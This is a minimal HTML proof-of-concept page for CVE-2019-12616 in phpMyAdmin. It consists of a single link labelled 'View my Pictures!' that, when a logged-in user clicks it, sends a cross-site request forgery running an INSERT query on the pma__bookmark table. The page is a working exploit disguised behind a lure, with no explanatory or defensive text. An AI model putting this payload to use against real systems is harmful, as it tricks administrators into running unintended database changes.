
<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>POC CVE-2019-12616</title>
</head>

<body>
<a href="http://localhost:8890/pma/tbl_sql.php?sql_query=INSERT+INTO+`pma__bookmark`+(`id`%2C+`dbase`%2C+`user`%2C+`label`%2C+`query`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark">View my Pictures!</a>
</body>
</html>
